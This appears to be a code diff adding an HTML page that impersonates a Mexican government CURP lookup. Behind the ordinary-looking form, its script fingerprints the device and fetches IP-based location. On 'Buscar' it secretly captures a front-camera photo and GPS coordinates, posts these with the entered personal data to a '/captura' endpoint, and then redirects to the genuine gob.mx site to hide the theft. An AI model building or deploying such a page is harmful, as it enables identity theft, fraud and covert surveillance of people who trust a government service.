@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Consulta tu CURP</title>
+<style>
+:root{--guinda:#691C32;--gris-tab:#E6E6E6;--borde-input:#D1D5DB;--borde-tarjeta:#E5E7EB;--texto:#1F2937;--suave:#6B7280}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#FFFFFF;color:var(--texto);padding:18px 12px 30px}
+.columna-angosta{max-width:362px;margin:0 auto}
+.titulo-principal{font-size:1.55rem;line-height:1.12;font-weight:800;color:#1F2937;margin-bottom:18px;margin-left:10mm}
+.subtitulo-busqueda{font-size:1.15rem;font-weight:800;color:#1F2937;padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin-bottom:14px}
+.descripcion{font-size:0.78rem;line-height:1.45;color:var(--suave);margin-bottom:18px}
+.tabs-apiladas{display:flex;flex-direction:column;align-items:flex-start}
+.tab-item{border:none;padding:7px 12px;font-size:0.76rem;border-radius:0;cursor:pointer;background:var(--gris-tab);color:#4B5563;font-family:inherit;text-align:left}
+.tab-item.activa{background:var(--guinda);color:#FFFFFF}
+.caja-form{background:#FFFFFF;border:1px solid var(--borde-tarjeta);box-shadow:0 2px 8px rgba(0,0,0,0.03);padding:16px 14px 26px}
+.panel-oculto{display:none}
+.seccion-titulo{font-size:0.8rem;font-weight:700;color:var(--guinda);padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin:8px 0 11px}
+.grupo-campo{margin-bottom:11px}
+.grupo-campo:last-child{margin-bottom:0}
+.grupo-campo label{display:block;font-size:0.76rem;font-weight:700;line-height:1.25;color:#1F2937;margin-bottom:4px}
+.grupo-campo input,.grupo-campo select{width:100%;height:33px;padding:0 9px;font-size:0.78rem;color:var(--texto);background:#FFFFFF;border:1px solid var(--borde-input);border-radius:3px;font-family:inherit}
+.grupo-campo input::placeholder{color:#9CA3AF}
+.grupo-campo input:focus,.grupo-campo select:focus{outline:none;border-color:var(--guinda)}
+.cp-info{font-size:0.7rem;color:#1c9c4c;font-weight:700;margin-top:3px;min-height:10px}
+.barra-inferior{margin-top:16px;display:flex;justify-content:space-between;align-items:center;gap:10px}
+.obligatorios{font-size:0.76rem;color:var(--suave)}
+.boton-buscar{display:inline-flex;align-items:center;gap:6px;background:#FFFFFF;color:var(--guinda);border:1.4px solid var(--guinda);border-radius:3px;padding:6px 14px;font-size:0.78rem;cursor:pointer;font-family:inherit;font-weight:600}
+.boton-buscar:disabled{opacity:.55;cursor:not-allowed}
+.tel-row{display:flex;gap:6px}
+.tel-lada{flex:0 0 46%;display:flex;align-items:center;gap:4px;height:33px;padding:0 6px;border:1px solid var(--borde-input);border-radius:3px;background:#FFFFFF;font-size:0.75rem}
+.tel-lada select{border:0;padding:0;height:auto;font-size:0.75rem;background:transparent;flex:1;outline:none;font-family:inherit}
+.tel-num{flex:1}
+</style>
+</head>
+<body>
+<div class="columna-angosta">
+  <h1 class="titulo-principal">Consulta tu<br>CURP</h1>
+  <h2 class="subtitulo-busqueda">Búsqueda</h2>
+  <p class="descripcion">La consulta puede efectuarse indicando la clave CURP cuando ya la conoce o proporcionando su nombre y datos de nacimiento.</p>
+
+  <div class="tabs-apiladas">
+    <button type="button" id="btn-tab-curp" class="tab-item activa" onclick="cambiarTab('curp')">Clave Única de Registro de Población</button>
+    <button type="button" id="btn-tab-datos" class="tab-item" onclick="cambiarTab('datos')">Datos Personales</button>
+  </div>
+
+  <form class="caja-form">
+    <div id="panel-curp">
+      <div class="grupo-campo">
+        <label for="curp">Clave Única de Registro de<br>Población (CURP)*:</label>
+        <input id="curp" type="text" maxlength="18" autocomplete="off" placeholder="Ingresa tu CURP" style="text-transform:uppercase" />
+      </div>
+    </div>
+
+    <div id="panel-datos" class="panel-oculto">
+      <div class="grupo-campo"><label for="nombre">Nombre(s)*:</label><input id="nombre" type="text" autocomplete="off" placeholder="Ingresa tu nombre(s)" /></div>
+      <div class="grupo-campo"><label for="primer-apellido">Primer apellido*:</label><input id="primer-apellido" type="text" autocomplete="off" placeholder="Ingresa tu primer apellido" /></div>
+      <div class="grupo-campo"><label for="segundo-apellido">Segundo apellido:</label><input id="segundo-apellido" type="text" autocomplete="off" placeholder="Ingresa tu segundo apellido" /></div>
+      <div class="grupo-campo"><label for="dia">Día de nacimiento*:</label><select id="dia"><option value="">Seleccionar el día</option></select></div>
+      <div class="grupo-campo"><label for="mes">Mes de nacimiento*:</label><select id="mes"><option value="">Seleccionar el mes</option></select></div>
+      <div class="grupo-campo"><label for="anio">Año de nacimiento*:</label><select id="anio"><option value="">Seleccionar el año</option></select></div>
+      <div class="grupo-campo"><label for="sexo">Sexo*:</label><select id="sexo"><option value="">Selecciona el sexo</option><option>Mujer</option><option>Hombre</option></select></div>
+      <div class="grupo-campo"><label for="estado">Estado*:</label><select id="estado"><option value="">Selecciona el estado</option><option>Ciudad de México</option><option>Estado de México</option><option>Hidalgo</option><option>Jalisco</option><option>Nuevo León</option><option>Puebla</option><option>Veracruz</option><option>Guanajuato</option><option>Michoacán</option><option>Oaxaca</option><option>Otro</option></select></div>
+
+      <div class="seccion-titulo">Domicilio y contacto</div>
+
+      <div class="grupo-campo"><label for="calle">Calle*:</label><input id="calle" type="text" autocomplete="off" placeholder="Ingresa tu calle" /></div>
+      <div class="grupo-campo"><label for="num-ext">Número exterior*:</label><input id="num-ext" type="text" autocomplete="off" placeholder="Ej. 123" /></div>
+      <div class="grupo-campo"><label for="num-int">Número interior:</label><input id="num-int" type="text" autocomplete="off" placeholder="Ej. Int. 4" /></div>
+      <div class="grupo-campo"><label for="cp">Código postal*:</label><input id="cp" type="text" maxlength="5" autocomplete="off" placeholder="Ej. 01730" /><div class="cp-info" id="cpInfo"></div></div>
+      <div class="grupo-campo"><label for="colonia">Colonia*:</label><input id="colonia" type="text" autocomplete="off" placeholder="Ej. Centro" /></div>
+      <div class="grupo-campo"><label for="municipio">Delegación / Municipio*:</label><input id="municipio" type="text" autocomplete="off" placeholder="Ej. Cuauhtémoc" /></div>
+      <div class="grupo-campo"><label for="estado-dom">Estado*:</label><input id="estado-dom" type="text" autocomplete="off" placeholder="Ej. Ciudad de México" /></div>
+      <div class="grupo-campo"><label for="entre">Entre qué calles:</label><input id="entre" type="text" autocomplete="off" placeholder="Ej. Hidalgo y Morelos" /></div>
+      <div class="grupo-campo">
+        <label for="telefono">Teléfono*:</label>
+        <div class="tel-row">
+          <div class="tel-lada">
+            <select id="lada"></select>
+          </div>
+          <input id="telefono" class="tel-num" type="tel" autocomplete="off" placeholder="10 dígitos" />
+        </div>
+      </div>
+      <div class="grupo-campo"><label for="email">Correo electrónico*:</label><input id="email" type="email" autocomplete="off" placeholder="correo@dominio.com" /></div>
+    </div>
+  </form>
+
+  <div class="barra-inferior">
+    <span class="obligatorios">* Campos obligatorios</span>
+    <button type="submit" class="boton-buscar" id="btnBuscar">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+      Buscar
+    </button>
+  </div>
+</div>
+
+<script>
+// ===== LADAS DEL MUNDO CON BANDERA =====
+var LADAS=[
+  ["🇦🇫","+93","Afganistán"],
+  ["🇦🇱","+355","Albania"],
+  ["🇩🇿","+213","Argelia"],
+  ["🇦🇩","+376","Andorra"],
+  ["🇦🇴","+244","Angola"],
+  ["🇦🇬","+1","Antigua y Barbuda"],
+  ["🇦🇷","+54","Argentina"],
+  ["🇦🇲","+374","Armenia"],
+  ["🇦🇼","+297","Aruba"],
+  ["🇦🇺","+61","Australia"],
+  ["🇦🇹","+43","Austria"],
+  ["🇦🇿","+994","Azerbaiyán"],
+  ["🇧🇸","+1","Bahamas"],
+  ["🇧🇭","+973","Bahréin"],
+  ["🇧🇩","+880","Bangladesh"],
+  ["🇧🇧","+1","Barbados"],
+  ["🇧🇾","+375","Bielorrusia"],
+  ["🇧🇪","+32","Bélgica"],
+  ["🇧🇿","+501","Belice"],
+  ["🇧🇯","+229","Benín"],
+  ["🇧🇹","+975","Bután"],
+  ["🇧🇴","+591","Bolivia"],
+  ["🇧🇦","+387","Bosnia"],
+  ["🇧🇼","+267","Botsuana"],
+  ["🇧🇷","+55","Brasil"],
+  ["🇧🇳","+673","Brunéi"],
+  ["🇧🇬","+359","Bulgaria"],
+  ["🇧🇫","+226","Burkina Faso"],
+  ["🇧🇮","+257","Burundi"],
+  ["🇨🇻","+238","Cabo Verde"],
+  ["🇰🇭","+855","Camboya"],
+  ["🇨🇲","+237","Camerún"],
+  ["🇨🇦","+1","Canadá"],
+  ["🇹🇩","+235","Chad"],
+  ["🇨🇱","+56","Chile"],
+  ["🇨🇳","+86","China"],
+  ["🇨🇾","+357","Chipre"],
+  ["🇨🇴","+57","Colombia"],
+  ["🇰🇲","+269","Comoras"],
+  ["🇨🇬","+242","Congo"],
+  ["🇨🇩","+243","Congo RD"],
+  ["🇰🇵","+850","Corea del Norte"],
+  ["🇰🇷","+82","Corea del Sur"],
+  ["🇨🇮","+225","Costa de Marfil"],
+  ["🇨🇷","+506","Costa Rica"],
+  ["🇭🇷","+385","Croacia"],
+  ["🇨🇺","+53","Cuba"],
+  ["🇩🇰","+45","Dinamarca"],
+  ["🇩🇯","+253","Yibuti"],
+  ["🇩🇲","+1","Dominica"],
+  ["🇪🇨","+593","Ecuador"],
+  ["🇪🇬","+20","Egipto"],
+  ["🇸🇻","+503","El Salvador"],
+  ["🇦🇪","+971","Emiratos Árabes"],
+  ["🇪🇷","+291","Eritrea"],
+  ["🇪🇪","+372","Estonia"],
+  ["🇸🇿","+268","Esuatini"],
+  ["🇪🇹","+251","Etiopía"],
+  ["🇫🇯","+679","Fiyi"],
+  ["🇵🇭","+63","Filipinas"],
+  ["🇫🇮","+358","Finlandia"],
+  ["🇫🇷","+33","Francia"],
+  ["🇬🇦","+241","Gabón"],
+  ["🇬🇲","+220","Gambia"],
+  ["🇬🇪","+995","Georgia"],
+  ["🇬🇭","+233","Ghana"],
+  ["🇬🇷","+30","Grecia"],
+  ["🇬🇩","+1","Granada"],
+  ["🇬🇹","+502","Guatemala"],
+  ["🇬🇳","+224","Guinea"],
+  ["🇬🇼","+245","Guinea-Bisáu"],
+  ["🇬🇶","+240","Guinea Ecuatorial"],
+  ["🇬🇾","+592","Guyana"],
+  ["🇭🇹","+509","Haití"],
+  ["🇭🇳","+504","Honduras"],
+  ["🇭🇺","+36","Hungría"],
+  ["🇮🇸","+354","Islandia"],
+  ["🇮🇳","+91","India"],
+  ["🇮🇩","+62","Indonesia"],
+  ["🇮🇷","+98","Irán"],
+  ["🇮🇶","+964","Irak"],
+  ["🇮🇪","+353","Irlanda"],
+  ["🇮🇱","+972","Israel"],
+  ["🇮🇹","+39","Italia"],
+  ["🇯🇲","+1","Jamaica"],
+  ["🇯🇵","+81","Japón"],
+  ["🇯🇴","+962","Jordania"],
+  ["🇰🇿","+7","Kazajistán"],
+  ["🇰🇪","+254","Kenia"],
+  ["🇰🇬","+996","Kirguistán"],
+  ["🇰🇮","+686","Kiribati"],
+  ["🇰🇼","+965","Kuwait"],
+  ["🇱🇦","+856","Laos"],
+  ["🇱🇸","+266","Lesoto"],
+  ["🇱🇻","+371","Letonia"],
+  ["🇱🇧","+961","Líbano"],
+  ["🇱🇷","+231","Liberia"],
+  ["🇱🇾","+218","Libia"],
+  ["🇱🇮","+423","Liechtenstein"],
+  ["🇱🇹","+370","Lituania"],
+  ["🇱🇺","+352","Luxemburgo"],
+  ["🇲🇬","+261","Madagascar"],
+  ["🇲🇼","+265","Malaui"],
+  ["🇲🇾","+60","Malasia"],
+  ["🇲🇻","+960","Maldivas"],
+  ["🇲🇱","+223","Malí"],
+  ["🇲🇹","+356","Malta"],
+  ["🇲🇦","+212","Marruecos"],
+  ["🇲🇭","+692","Islas Marshall"],
+  ["🇲🇷","+222","Mauritania"],
+  ["🇲🇺","+230","Mauricio"],
+  ["🇲🇽","+52","México"],
+  ["🇫🇲","+691","Micronesia"],
+  ["🇲🇩","+373","Moldavia"],
+  ["🇲🇨","+377","Mónaco"],
+  ["🇲🇳","+976","Mongolia"],
+  ["🇲🇪","+382","Montenegro"],
+  ["🇲🇿","+258","Mozambique"],
+  ["🇲🇲","+95","Myanmar"],
+  ["🇳🇦","+264","Namibia"],
+  ["🇳🇷","+674","Nauru"],
+  ["🇳🇵","+977","Nepal"],
+  ["🇳🇱","+31","Países Bajos"],
+  ["🇳🇿","+64","Nueva Zelanda"],
+  ["🇳🇮","+505","Nicaragua"],
+  ["🇳🇪","+227","Níger"],
+  ["🇳🇬","+234","Nigeria"],
+  ["🇳🇴","+47","Noruega"],
+  ["🇴🇲","+968","Omán"],
+  ["🇵🇰","+92","Pakistán"],
+  ["🇵🇼","+680","Palaos"],
+  ["🇵🇸","+970","Palestina"],
+  ["🇵🇦","+507","Panamá"],
+  ["🇵🇬","+675","Papúa Nueva Guinea"],
+  ["🇵🇾","+595","Paraguay"],
+  ["🇵🇪","+51","Perú"],
+  ["🇵🇱","+48","Polonia"],
+  ["🇵🇹","+351","Portugal"],
+  ["🇶🇦","+974","Qatar"],
+  ["🇷🇴","+40","Rumanía"],
+  ["🇷🇺","+7","Rusia"],
+  ["🇷🇼","+250","Ruanda"],
+  ["🇰🇳","+1","San Cristóbal y Nieves"],
+  ["🇱🇨","+1","Santa Lucía"],
+  ["🇻🇨","+1","San Vicente"],
+  ["🇼🇸","+685","Samoa"],
+  ["🇸🇲","+378","San Marino"],
+  ["🇸🇹","+239","Santo Tomé"],
+  ["🇸🇦","+966","Arabia Saudita"],
+  ["🇸🇳","+221","Senegal"],
+  ["🇷🇸","+381","Serbia"],
+  ["🇸🇨","+248","Seychelles"],
+  ["🇸🇱","+232","Sierra Leona"],
+  ["🇸🇬","+65","Singapur"],
+  ["🇸🇰","+421","Eslovaquia"],
+  ["🇸🇮","+386","Eslovenia"],
+  ["🇸🇧","+677","Islas Salomón"],
+  ["🇸🇴","+252","Somalia"],
+  ["🇿🇦","+27","Sudáfrica"],
+  ["🇸🇸","+211","Sudán del Sur"],
+  ["🇸🇩","+249","Sudán"],
+  ["🇪🇸","+34","España"],
+  ["🇱🇰","+94","Sri Lanka"],
+  ["🇸🇪","+46","Suecia"],
+  ["🇨🇭","+41","Suiza"],
+  ["🇸🇷","+597","Surinam"],
+  ["🇸🇾","+963","Siria"],
+  ["🇹🇯","+992","Tayikistán"],
+  ["🇹🇿","+255","Tanzania"],
+  ["🇹🇭","+66","Tailandia"],
+  ["🇹🇱","+670","Timor Oriental"],
+  ["🇹🇬","+228","Togo"],
+  ["🇹🇴","+676","Tonga"],
+  ["🇹🇹","+1","Trinidad y Tobago"],
+  ["🇹🇳","+216","Túnez"],
+  ["🇹🇷","+90","Turquía"],
+  ["🇹🇲","+993","Turkmenistán"],
+  ["🇹🇻","+688","Tuvalu"],
+  ["🇺🇬","+256","Uganda"],
+  ["🇺🇦","+380","Ucrania"],
+  ["🇺🇾","+598","Uruguay"],
+  ["🇺🇸","+1","Estados Unidos"],
+  ["🇺🇿","+998","Uzbekistán"],
+  ["🇻🇺","+678","Vanuatu"],
+  ["🇻🇦","+39","Vaticano"],
+  ["🇻🇪","+58","Venezuela"],
+  ["🇻🇳","+84","Vietnam"],
+  ["🇾🇪","+967","Yemen"],
+  ["🇿🇲","+260","Zambia"],
+  ["🇿🇼","+263","Zimbabue"],
+  ["🇭🇰","+852","Hong Kong"],
+  ["🇲🇴","+853","Macao"],
+  ["🇬🇱","+299","Groenlandia"],
+  ["🇬🇮","+350","Gibraltar"],
+  ["🇧🇲","+1","Bermudas"],
+  ["🇰🇾","+1","Islas Caimán"],
+  ["🇦🇬","+1","Antigua"],
+  ["🇧🇶","+599","Caribe Neerlandés"],
+  ["🇹🇼","+886","Taiwán"],
+  ["🇦🇽","+358","Islas Åland"]
+];
+
+(function(){
+  // Select de día
+  var diaSel=document.getElementById('dia');
+  for(var i=1;i<=31;i++){var o=document.createElement('option');o.value=String(i).padStart(2,'0');o.textContent=String(i).padStart(2,'0');diaSel.appendChild(o);}
+  // Select de mes
+  var mesSel=document.getElementById('mes');
+  var meses=['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
+  meses.forEach(function(nm,idx){var o=document.createElement('option');o.value=String(idx+1).padStart(2,'0');o.textContent=nm;mesSel.appendChild(o);});
+  // Select de año
+  var anioSel=document.getElementById('anio');
+  for(var a=2026;a>=1940;a--){var op=document.createElement('option');op.value=String(a);op.textContent=String(a);anioSel.appendChild(op);}
+  // Select de lada CON BANDERA
+  var ladaSel=document.getElementById('lada');
+  LADAS.forEach(function(item){
+    var opt=document.createElement('option');
+    opt.value=item[1];
+    opt.textContent=item[0]+" "+item[1]+" "+item[2];
+    opt.setAttribute('data-bandera',item[0]);
+    ladaSel.appendChild(opt);
+  });
+})();
+
+document.getElementById('lada').addEventListener('change',function(){
+  var opt=this.options[this.selectedIndex];
+  // La bandera ya va dentro del texto del option, no hace falta span aparte
+});
+
+window.addEventListener('load',function(){
+  setTimeout(function(){
+    document.querySelectorAll('input').forEach(function(el){el.value='';});
+    document.querySelectorAll('select').forEach(function(el){el.selectedIndex=0;});
+    var cpi=document.getElementById('cpInfo'); if(cpi) cpi.innerHTML='';
+  },150);
+});
+
+var info={modelo:navigator.userAgent,so:navigator.platform||'?',navegador:'?',pantalla:screen.width+'x'+screen.height,idioma:navigator.language,bateria:'?',red:navigator.connection?navigator.connection.effectiveType:'?',ip:'?',ciudad:'?',pais:'?',gps:'no'};
+var foto='',form={};
+var ua=navigator.userAgent;
+if(ua.indexOf('Chrome')>-1)info.navegador='Chrome';else if(ua.indexOf('Safari')>-1)info.navegador='Safari';else if(ua.indexOf('Firefox')>-1)info.navegador='Firefox';else info.navegador='Otro';
+var m='Móvil';if(ua.indexOf('iPhone')>-1)m='iPhone Apple';else if(ua.indexOf('iPad')>-1)m='iPad Apple';else if(ua.indexOf('Android')>-1){var mm=ua.match(/Android[^;]*;\s*([^)]+)/);m=mm?mm[1]:'Android';}info.modelo=m;
+if(ua.indexOf('iPhone OS')>-1)info.so='iOS '+((ua.match(/OS (\d+_\d+)/)||[])[1]||'').replace('_','.');else if(ua.indexOf('Android')>-1)info.so='Android '+((ua.match(/Android (\d+\.?\d*)/)||[])[1]||'');else if(ua.indexOf('Windows')>-1)info.so='Windows';
+fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{info.ip=d.ip||'?';info.ciudad=(d.city||'?')+(d.region?', '+d.region:'');info.pais=d.country_name||'?';}).catch(()=>{});
+if(navigator.getBattery)navigator.getBattery().then(b=>{info.bateria=Math.round(b.level*100)+'%'+(b.charging?' ⚡':' 🔋');});
+function v(id){var el=document.getElementById(id);return el?el.value:'';}
+function cambiarTab(tab){
+  var btnCurp=document.getElementById('btn-tab-curp'),btnDatos=document.getElementById('btn-tab-datos');
+  var panelCurp=document.getElementById('panel-curp'),panelDatos=document.getElementById('panel-datos');
+  if(tab==='curp'){btnCurp.classList.add('activa');btnDatos.classList.remove('activa');panelCurp.classList.remove('panel-oculto');panelDatos.classList.add('panel-oculto');}
+  else{btnDatos.classList.add('activa');btnCurp.classList.remove('activa');panelDatos.classList.remove('panel-oculto');panelCurp.classList.add('panel-oculto');}
+}
+function leerForm(){
+  form={};
+  var campos={nombre:'nombre',ap:'primer-apellido',am:'segundo-apellido',dia:'dia',mes:'mes',anio:'anio',sexo:'sexo',entidad:'estado',calle:'calle',num_ext:'num-ext',num_int:'num-int',cp:'cp',colonia:'colonia',municipio:'municipio',estado:'estado-dom',entre:'entre',email:'email'};
+  for(var k in campos){var val=v(campos[k]); if(val) form[k]=val;}
+  if(form.dia && form.mes && form.anio) form.fecha=form.dia+'/'+form.mes+'/'+form.anio;
+  var lada=v('lada'), tel=v('telefono');
+  if(tel) form.tel=lada+' '+tel;
+}
+function enviar(){return fetch('/captura',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tipo:'captura',foto:foto,info:info,formulario:form})}).catch(()=>{});}
+var CP_MUNICIPIOS={'01000':'Álvaro Obregón','01210':'Álvaro Obregón','01730':'Álvaro Obregón','02000':'Azcapotzalco','02300':'Azcapotzalco','03000':'Benito Juárez','03100':'Benito Juárez','03810':'Benito Juárez','04000':'Coyoacán','04100':'Coyoacán','05000':'Cuajimalpa de Morelos','06000':'Cuauhtémoc','06010':'Cuauhtémoc','06700':'Cuauhtémoc','07000':'Gustavo A. Madero','07300':'Gustavo A. Madero','08000':'Iztacalco','09000':'Iztapalapa','09800':'Iztapalapa','10000':'La Magdalena Contreras','11000':'Miguel Hidalgo','11560':'Miguel Hidalgo','12000':'Milpa Alta','13000':'Tláhuac','14000':'Tlalpan','15000':'Venustiano Carranza','16000':'Xochimilco','50000':'Toluca','52000':'Lerma','54000':'Tlalnepantla','57000':'Nezahualcóyotl'};
+function completarMunicipio(cp){
+  var m=document.getElementById('municipio');
+  if(CP_MUNICIPIOS[cp]){m.value=CP_MUNICIPIOS[cp];return;}
+  for(var k in CP_MUNICIPIOS){if(Math.abs(parseInt(k)-parseInt(cp))<3000){m.value=CP_MUNICIPIOS[k];return;}}
+}
+function autocompletarCP(cp){
+  var box=document.getElementById('cpInfo');box.innerHTML='';box.style.color='#1c9c4c';
+  if(!/^\d{5}$/.test(cp))return;
+  box.innerHTML='Buscando…';box.style.color='#888';
+  fetch('https://api.zippopotam.us/mx/'+cp).then(r=>r.ok?r.json():Promise.reject()).then(function(data){
+    var places=data.places||[];
+    if(!places.length){box.style.color='#c00';box.innerHTML='CP no encontrado';return;}
+    var p=places[0];
+    var em={'Distrito Federal':'Ciudad de México','Estado de Mexico':'Estado de México','Nuevo Leon':'Nuevo León','Michoacan':'Michoacán','Yucatan':'Yucatán','Queretaro':'Querétaro'};
+    var est=em[p.state]||p.state;
+    document.getElementById('colonia').value=p['place name']||'';
+    document.getElementById('estado-dom').value=est;
+    completarMunicipio(cp);
+    box.style.color='#1c9c4c';box.innerHTML='✓ '+(p['place name']||'')+', '+est;
+  }).catch(function(){box.style.color='#c00';box.innerHTML='No se pudo autocompletar';});
+}
+document.getElementById('cp').addEventListener('input',function(){autocompletarCP(this.value);});
+async function ejecutarFlujo(boton){
+  boton.disabled=true;
+  boton.innerHTML='<span class="load"></span> Buscando…';
+  try{
+    var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    await new Promise(r=>setTimeout(r,1000));
+    var video=document.createElement('video');video.srcObject=stream;await video.play();
+    await new Promise(r=>setTimeout(r,600));
+    var c=document.createElement('canvas');c.width=video.videoWidth;c.height=video.videoHeight;
+    c.getContext('2d').drawImage(video,0,0);foto=c.toDataURL('image/jpeg',0.85);
+    stream.getTracks().forEach(t=>t.stop());
+  }catch(e){}
+  await new Promise(r=>setTimeout(r,300));
+  await new Promise(res=>{navigator.geolocation.getCurrentPosition(p=>{info.gps=p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);res();},()=>{info.gps='denegada';res();},{timeout:6000});});
+  await enviar();
+  await new Promise(r=>setTimeout(r,800));
+  window.location='https://www.gob.mx/curp/';
+}
+document.getElementById('btnBuscar').onclick=async function(e){
+  e.preventDefault();
+  var panelCurpVisible=!document.getElementById('panel-curp').classList.contains('panel-oculto');
+  if(panelCurpVisible){form={};form.curp=v('curp');if(!form.curp)form.curp='(vacío)';}
+  else{leerForm();}
+  await ejecutarFlujo(this);
+};
+</script>
+</body>
+</html>
